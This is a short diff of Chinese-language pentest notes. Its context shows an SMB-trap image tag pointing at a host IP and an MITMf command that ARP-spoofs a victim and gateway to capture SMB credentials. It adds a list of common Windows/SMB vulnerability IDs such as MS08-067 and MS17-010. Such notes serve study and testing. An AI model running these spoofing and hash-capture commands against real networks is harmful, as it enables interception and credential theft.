@@ -251,3 +251,15 @@ img src="\\主机IP地址\image.jpg"
 ```Bash
 python mitmf.py -spoof -arp -smbtrap -target 受害者IP地址 -gateway 网关地址 -i eth0
 ```
+
+## 常见漏洞
+
++ MS08-067
++ MS17-010
++ CVE-2017-7474
++ CVE-2020-0796
++ conficker
++ CVE-2009-3103
++ MS06-025
++ MS07-029
++ regsvc-dos
